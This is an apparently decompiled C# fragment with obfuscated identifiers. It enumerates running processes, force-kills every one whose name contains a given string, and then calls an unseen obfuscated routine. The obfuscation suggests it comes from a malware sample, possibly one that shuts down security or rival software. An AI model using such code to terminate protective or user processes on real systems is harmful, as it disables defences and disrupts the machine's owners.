using System;
using System.Diagnostics;

namespace oXSOOyVgTNm;

public sealed class TjoAdPXXFmz
{
	public static bool MoEhYOyNxKDJCP(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void xLhSiyOfOwQKA(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (MoEhYOyNxKDJCP(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					NuHMiFuRoVNiZNRl.sYQQGplgMYk();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
